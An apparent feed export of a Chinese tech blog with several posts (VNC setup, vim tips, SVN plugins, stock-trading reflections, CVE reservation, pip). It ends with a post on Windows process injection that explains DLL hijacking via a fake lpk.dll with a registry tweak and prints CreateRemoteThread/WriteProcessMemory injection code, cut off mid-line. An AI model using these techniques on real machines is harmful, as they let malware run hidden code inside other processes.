    <content type="html"><![CDATA[<p>因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。</p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="(1) 安装"></a>(1) 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install tigervnc-server<br></code></pre></td></tr></table></figure><h2 id="2-创建服务"><a href="#2-创建服务" class="headerlink" title="(2) 创建服务"></a>(2) 创建服务</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>vncserver@.service <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/</span>vncserver@.service<br></code></pre></td></tr></table></figure><p>编辑 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;vncserver@.service 替换下面两行的USER为实际用户名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">ExecStart</span>=/sbin/runuser -l<span class="hljs-built_in"> USER </span>-c <span class="hljs-string">&quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;</span><br><span class="hljs-attribute">PIDFile</span>=/home/USER/.vnc/%H%i.pid<br></code></pre></td></tr></table></figure><p>执行命令 <code>systemctl daemon-reload</code></p><p>使用vpnpasswd修改密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">~]<span class="hljs-comment"># su - USER</span><br>~]$ vncpasswd<br>Password:<br>Verify:<br></code></pre></td></tr></table></figure><p>启动vncserver的命令行</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sudo systemctl start <span class="hljs-symbol">vncserver@</span>:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>参考文档：</p><p><a href="https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html">https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html</a></p><h2 id="3-直接调用命令行"><a href="#3-直接调用命令行" class="headerlink" title="(3)直接调用命令行"></a>(3)直接调用命令行</h2><p>使用上面的方法过于繁琐，可以直接调用 vncserver 的命令行</p><p><code>vncserver :2 -geometry 1920x1080 -depth 24</code></p><h2 id="4-改变vnc的默认桌面"><a href="#4-改变vnc的默认桌面" class="headerlink" title="(4) 改变vnc的默认桌面"></a>(4) 改变vnc的默认桌面</h2><p>vim ~&#x2F;.vnc&#x2F;xstartup</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">unset</span> SESSION_MANAGER<br><span class="hljs-built_in">unset</span> DBUS_SESSION_BUS_ADDRESS<br><span class="hljs-comment">#exec /etc/X11/xinit/xinitrc</span><br><br><span class="hljs-built_in">exec</span> /bin/sh /etc/xdg/xfce4/xinitrc<br></code></pre></td></tr></table></figure><p>必须改变默认桌面，要不可能登录不进去。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>个人觉得从安全角度看，使用命令启用 vncserver 是比较合理的，要用了就打开，用完就关。另外vncserver 连接加了一层 tunnel，安全无小事。</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim 输入特殊字符</title>
    <link href="/cn/vim_special_char/"/>
    <url>/cn/vim_special_char/</url>
    
    <content type="html"><![CDATA[<p>vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。</p><p><a href="http://vimhelp.appspot.com/digraph.txt.html">http://vimhelp.appspot.com/digraph.txt.html</a><br><a href="http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit">http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit</a></p><p>关键就在上面两篇，可能许多人不喜欢看复杂的文章，我这里简单介绍一下用法。</p><p>输入音标 ə</p><p>i 进入编辑模式    CTRL-vu0259<br>那如何知道 ə 的 unicode hex number 是 0259呢，在vim的normal 模式下，将光标移动到ə输入ga</p><p>输入 ⇒</p><p>i 进入编辑模式   CTRL-k&#x3D;&gt;<br>:dig 可以看到支持这种方法输入的unicode 字符</p>]]></content>
    
    
    
    <tags>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VIM + SVN 管理</title>
    <link href="/cn/svn_vim/"/>
    <url>/cn/svn_vim/</url>
    
    <content type="html"><![CDATA[<p>公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。</p><h2 id="1-vcscommand-vim"><a href="#1-vcscommand-vim" class="headerlink" title="1. vcscommand.vim"></a>1. vcscommand.vim</h2><p><a href="http://www.vim.org/scripts/script.php?script_id=90">http://www.vim.org/scripts/script.php?script_id=90</a></p><p>这个插件的特点是支持的版本管理工具多,支持git，svn等常见版本管理工具。<br>vcscommand.vim插件默认绑定了无差别的快捷键，使用起来非常方便。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">ca</span> VCSAdd<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cn</span> VCSAnnotate<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cN</span> VCSAnnotate!<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cc</span> VCSCommit<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cD</span> VCSDelete<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cd</span> VCSDiff<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cg</span> VCSGotoOriginal<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cG</span> VCSGotoOriginal!<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">ci</span> VCSInfo<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cl</span> VCSLog<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cL</span> VCSLock<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cr</span> VCSReview<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cs</span> VCSStatus<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cu</span> VCSUpdate<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cU</span> VCSUnlock<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cv</span> VCSVimDiff<br></code></pre></td></tr></table></figure><p>这个 <code>&lt;Leader&gt;</code> 得看你定义了什么快捷键，vim 默认的是 <code>\</code></p><h2 id="2-vim-unite-svn"><a href="#2-vim-unite-svn" class="headerlink" title="2.  vim-unite-svn"></a>2.  vim-unite-svn</h2><p>小日本写的unite.vim的svn插件，unite.vim 是一个非常不错的vim插件，<br>它的作用是 为vim 写简单界面，要使用vim-unite-svn首先需要安装unite.vim 插件，<br>折腾这个插件的原因是vcscommand.vim有些不太好的地方。</p><ul><li>buffer管理的不太好</li><li>status 比较弱</li><li>羡慕emacs的vc mode的体验</li></ul><p><a href="https://github.com/Shougo/unite.vim">https://github.com/Shougo/unite.vim</a></p><p>小日本写的 <code>vim-unite-svn</code> 插件太久没有更新了，有一些bug，我修改了一下，用了<br>一段时间暂时没有发现什么问题。</p><p><a href="https://github.com/henices/vim-unite-svn">https://github.com/henices/vim-unite-svn</a></p><p>支持基本的svn命令， svn status, svn info, svn diff, svn commit, svn up</p><p>使用示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">:Unite svn/status<br>:Unite svn/diff<br>:Unite svn/blame<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人炒股经历</title>
    <link href="/cn/stock_experience/"/>
    <url>/cn/stock_experience/</url>
    
    <content type="html"><![CDATA[<p>本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小赚出局了。</p><p>运气好的是，2015年的时候中了一支新股，新股的收益对冲了倒金字塔加仓的回撤，小赚1万元出局清了仓，有时候我也在想如果不是这赚了1万，是不是也就不会继续炒股了。接下来的事情大家都很熟悉了，熔断和股灾3.0，一直在不赚和小亏中挣扎着，居然也坚持了下来。理工男的特质救了我，从2015年开始认真学习股票操作，恶补基础知识，分时，K线，缺口，价量关系，缠论，波浪理论，箱体理论，趋势交易，价值投资，基本各种理论都看了遍，其实到最后发现有用的东西太少了，关于股票的书也基本没啥用，真正有用的书可能就那么几本，可是如果不看几十本的话，你怎么知道哪几本有用呢？所以炒股并不存在什么捷径，一夜暴富基本是神话，为啥呢？盈亏同源，怎么赚钱就可能怎么亏回去，除非你知道你为什么能赚钱。</p><p>下面是这些年的心得，应该可以涨几年功力吧？</p><p>要在市场上生存你必须具备某种优势，没有这种优势就是纯赌博，真正赚钱的是要做大概率的投机。买卖股票实际上是对股票做分类，哪些可以做，哪些不可以做，这就涉及了股票交易系统，有了交易系统，剩下的就是执行问题了，要做到BDWQ，后面就是仓位计算，根据股票的波动和你愿意承担的风险程度计算出来。</p><p>回首看虽然现在稳定盈利了，又回到了灵魂拷问，投入的时间值得吗？对于很多人来说，最重要可能是资金的原始积累，10万块，翻10倍，100万在中国很多城市一套房也买不了，更不用说财富自由了，所以先努力工作吧，边工作边加大投资比例，梦想还是要有的，万一实现了呢？</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>市场情绪指标</title>
    <link href="/cn/stock_emotion/"/>
    <url>/cn/stock_emotion/</url>
    
    <content type="html"><![CDATA[<p>可以量化一下，有时间考虑程序实现。</p><ul><li>涨&#x2F;跌停板数</li><li>涨停封版成功率</li><li>涨跌股票比率</li><li>大盘成交量额</li><li>融资余额情况</li><li>北向资金净流入 （参考）</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>How to request a RESERVED CVE</title>
    <link href="/cn/request_RESERVED_CVE/"/>
    <url>/cn/request_RESERVED_CVE/</url>
    
    <content type="html"><![CDATA[<p>在申请 CVE 过程中会遇到一个问题，向软件官方提交漏洞修复后，由于软件官方不是CNA 无法直接分配CVE，而申请CVE 通常需要一个软件官方确认的链接，而有些比较正规的软件在漏洞修复之前是不会有公开链接的，这就无法申请CVE了。</p><p>有点鸡生蛋，蛋生鸡的感觉。解决这个问题的办法是申请一个 RESERVED CVE。</p><h2 id="申请-RESERVED-CVE-方法"><a href="#申请-RESERVED-CVE-方法" class="headerlink" title="申请 RESERVED CVE 方法"></a>申请 RESERVED CVE 方法</h2><p>申请 RESERVED CVE，也是需要填写的CVE 申请表格的 <a href="https://cveform.mitre.org/%EF%BC%8C%E9%80%89%E6%8B%A9">https://cveform.mitre.org/，选择</a> Request CVE ID</p><p>根据提示的重要信息：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">IMPORTANT: Once a CVE ID <span class="hljs-keyword">is</span> assigned <span class="hljs-keyword">to</span> your vulnerability, <span class="hljs-keyword">it</span> will <span class="hljs-keyword">not</span> be published <br><span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> CVE List <span class="hljs-keyword">until</span> you have submitted a URL pointing <span class="hljs-keyword">to</span> public information <span class="hljs-keyword">about</span> <br><span class="hljs-keyword">the</span> vulnerability. Without a public <span class="hljs-keyword">reference</span>, <span class="hljs-keyword">the</span> CVE ID will display <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;RESERVED&quot;</span> <br><span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> CVE List. Please update CVE <span class="hljs-keyword">with</span> <span class="hljs-keyword">a reference</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> vulnerability&#x27;s <br>details <span class="hljs-keyword">as</span> soon <span class="hljs-keyword">as</span> possible. See this FAQ <span class="hljs-keyword">for</span> more information.<br></code></pre></td></tr></table></figure><p>只要将 public reference 留空，就可以申请 RESERVED CVE 了。CVE 官方收到请求后会有确认的邮件。</p><h2 id="CVE-官方分配-CVE-ID"><a href="#CVE-官方分配-CVE-ID" class="headerlink" title="CVE 官方分配 CVE ID"></a>CVE 官方分配 CVE ID</h2><p>CVE 官方收到 RESERVED CVE 请求后，会给分配一个 CVE ID，但是状态为 ** RESERVED ** ，不会有公开细节。</p><h2 id="RESERVED-CVE-申请公开"><a href="#RESERVED-CVE-申请公开" class="headerlink" title="RESERVED CVE 申请公开"></a>RESERVED CVE 申请公开</h2><p>当软件官方确认已经修复漏洞，并且发布新版后，可以通知 CVE 官方更新 CVE 的状态。还是通过填写 <a href="https://cveform.mitre.org/">https://cveform.mitre.org/</a> 表格，选择 Notify CVE about a publication，填写相关信息。</p><h2 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h2><ol><li>将 <a href="mailto:&#x63;&#118;&#x65;&#x2d;&#x72;&#101;&#x71;&#x75;&#101;&#115;&#116;&#64;&#109;&#105;&#x74;&#x72;&#101;&#x2e;&#x6f;&#114;&#103;">&#x63;&#118;&#x65;&#x2d;&#x72;&#101;&#x71;&#x75;&#101;&#115;&#116;&#64;&#109;&#105;&#x74;&#x72;&#101;&#x2e;&#x6f;&#114;&#103;</a> 和  <a href="mailto:&#99;&#118;&#101;&#64;&#109;&#105;&#x74;&#x72;&#101;&#x2e;&#x6f;&#114;&#x67;">&#99;&#118;&#101;&#64;&#109;&#105;&#x74;&#x72;&#101;&#x2e;&#x6f;&#114;&#x67;</a> 加入邮件白名单 （有可能邮件会被截拦）</li><li>在申请公开步骤中，CVE 官方有可能和你要公开披露的链接，如果软件官方不给写，可以自己写一个</li></ol><p>披露要求的信息：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[CVE ID]</span><br><span class="hljs-string">[PRODUCT]</span><br><span class="hljs-string">[VERSION]</span><br><span class="hljs-string">[PROBLEM TYPE]</span><br><span class="hljs-string">[DESCRIPTION]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 多版本使用 pip</title>
    <link href="/cn/python_pip/"/>
    <url>/cn/python_pip/</url>
    
    <content type="html"><![CDATA[<p>Q：Fedora 31 提供的 Python3.7， 想使用 Python3.8， 用系统的pip3 只会给 Python3.7 安装库，如何解决</p><p>A:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -O https://bootstrap.pypa.io/get-pip.py<br>python3.8 get-pip.py<br></code></pre></td></tr></table></figure><p>执行上面命令后，会在 &#x2F;usr&#x2F;local&#x2F;bin&#x2F; 下生成和 pip 相关的脚本，把这些脚本删除，要不可能会和系统的 pip3 冲突。<br>接下来就可以使用下面的命令行安装 Python3.8 的库</p><p><code>python3.8 -m pip install pyhash --user</code></p><p>在安装过程中可能会因为众所周知的原因导致网络出错，备好梯子即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 进程注入</title>
    <link href="/cn/process_injection/"/>
    <url>/cn/process_injection/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p><h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK WINAPI <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params">  _In_  <span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params">  _In_  HOOKPROC lpfn,</span><br><span class="hljs-params">  _In_  HINSTANCE hMod,</span><br><span class="hljs-params">  _In_  DWORD dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><ul><li>dwThread 为0，将监管系统中所有线程。</li><li>idHook        指定监控event的类型</li><li>hMod          dll句柄</li><li>lpfn          hook例程的指针</li></ul><p>MSDN给出了一个使用的例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HOOKPROC hkprcSysMsg;<br><span class="hljs-type">static</span> HINSTANCE hinstDLL; <br><span class="hljs-type">static</span> HHOOK hhookSysMsg; <br> <br>hinstDLL = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); <br>hkprcSysMsg = (HOOKPROC)<span class="hljs-built_in">GetProcAddress</span>(hinstDLL, <span class="hljs-string">&quot;SysMessageProc&quot;</span>); <br><br>hhookSysMsg = <span class="hljs-built_in">SetWindowsHookEx</span>( <br>                    WH_SYSMSGFILTER,<br>                    hkprcSysMsg,<br>                    hinstDLL,<br>                    <span class="hljs-number">0</span>); <br></code></pre></td></tr></table></figure><p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p><h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p><p>  这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll<br>中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll<br>过了一道，所以称为为劫持。</p><p>  这里有二个问题，值得思考。</p><h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p><p> <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">a. The directory <span class="hljs-keyword">from</span> which the application loaded.<br>b. The <span class="hljs-keyword">current</span> directory.<br>c. The <span class="hljs-keyword">system</span> directory. Use the GetSystemDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.<br>d. The <span class="hljs-number">16</span>-<span class="hljs-type">bit</span> <span class="hljs-keyword">system</span> directory. There <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">function</span> that obtains the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory, but it <span class="hljs-keyword">is</span> searched.<br>e. The Windows directory. Use the GetWindowsDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.<br>f. The directories that are listed <span class="hljs-keyword">in</span> the <span class="hljs-type">PATH</span> environment variable. Note that<br>   this does <span class="hljs-keyword">not</span> <span class="hljs-keyword">include</span> the per-application <span class="hljs-type">path</span> specified <span class="hljs-keyword">by</span> the App<br>   Paths registry key. The App Paths key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> used <span class="hljs-keyword">when</span> computing the DLL<br>   <span class="hljs-keyword">search</span> <span class="hljs-type">path</span>.<br></code></pre></td></tr></table></figure><p>因此把lpk.dll放到运行的程序同一目录即可。</p><h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Windows Registry Editor Version <span class="hljs-number">5.00</span><br><br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]<br><span class="hljs-string">&quot;ExcludeFromKnownDlls&quot;</span><span class="hljs-operator">=</span>hex(<span class="hljs-number">7</span>):<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">70</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>b<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>e<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">64</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function">HANDLE WINAPI <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   HANDLE hProcess,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   SIZE_T dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   DWORD dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">_Out_  LPDWORD lpThreadId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>hProcess        要注入的进程的句柄</li><li>lpStartAddress  远程进程中执行的函数的地址（指针）</li><li>lpParameter     远程进程中执行的函数的参数的地址 （指针）</li></ul><h4 id="实现个DLL"><a href="#实现个DLL" class="headerlink" title="实现个DLL"></a>实现个DLL</h4><p>  第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。</p><p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p><p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p><p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE process = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);<br><span class="hljs-keyword">if</span> (process == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Get address of the LoadLibrary function.</span><br><span class="hljs-comment">*/</span><br>LPVOID addr = (LPVOID)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Allocate new memory region inside the process&#x27;s address space.</span><br><span class="hljs-comment">*/</span><br>LPVOID arg = (LPVOID)<span class="hljs-built_in">VirtualAllocEx</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (arg == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n = <span class="hljs-built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="hljs-built_in">strlen</span>(buffer), 